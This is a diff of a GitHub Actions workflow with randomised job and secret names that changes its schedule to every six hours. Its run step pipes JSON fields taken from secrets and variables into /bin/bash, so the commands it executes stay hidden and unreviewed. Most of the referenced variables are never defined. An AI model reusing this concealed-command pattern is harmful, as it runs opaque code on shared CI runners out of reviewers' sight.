@@ -2,7 +2,7 @@ name: taodingren6735
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '40 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: taodingren6735
         env:
-          fao85786: ${{ secrets.fao85786 }}
+          wcr1620: ${{ secrets.wcr1620 }}
         run: |
-          echo $fao85786 | jq -r .jsw01182 | /bin/bash
-          echo $ia8190 | jq -r .uz426 | /bin/bash
-          echo $zzt78826 | jq -r .xmyfr41665 | /bin/bash
-          echo $rpm1745 | jq -r .shbyf0887 | /bin/bash
-          echo $boyas13271 | jq -r .ulf90787 | /bin/bash
-          echo $b6 | jq -r .icz661 | /bin/bash
-          echo $vspg909 | jq -r .uyfo3102 | /bin/bash
-          echo $fhrp7489 | jq -r .dugc674 | /bin/bash
-          echo $cme69194 | jq -r .ge6016 | /bin/bash
-          echo $abos7 | jq -r .i98970 | /bin/bash
-          echo $rs56 | jq -r .xq23 | /bin/bash
-          echo $dpdr02 | jq -r .jjozl927 | /bin/bash
+          echo $wcr1620 | jq -r .smgok4459 | /bin/bash
+          echo $g424 | jq -r .mf32007 | /bin/bash
+          echo $upt7 | jq -r .upzwt0229 | /bin/bash
+          echo $mcv4127 | jq -r .oedqn724 | /bin/bash
 
